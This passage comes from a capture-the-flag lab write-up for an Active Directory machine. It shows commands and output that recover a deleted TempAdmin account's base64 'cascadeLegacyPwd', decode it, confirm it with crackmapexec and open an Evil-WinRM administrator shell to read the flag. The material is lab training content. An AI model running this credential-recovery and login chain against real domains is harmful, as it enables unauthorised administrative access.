*Evil-WinRM* PS C:\> Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM

```

Immediately `cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz` jumps out. It decodes to `baCT3r1aN00dles`:

```

root@kali# echo YmFDVDNyMWFOMDBkbGVz | base64 -d
baCT3r1aN00dles

```

### WinRM

This password works for the main administrator account:

```

root@kali# crackmapexec winrm 10.10.10.182 -u administrator -p baCT3r1aN00dles
WINRM       10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         [+] CASCADE\administrator:baCT3r1aN00dles (Pwn3d!)

```

I can get a WinRM session as administrator:

```

root@kali# evil-winrm -u administrator -p baCT3r1aN00dles -i 10.10.10.182

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

And get `root.txt`:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
5e9c87e9************************

```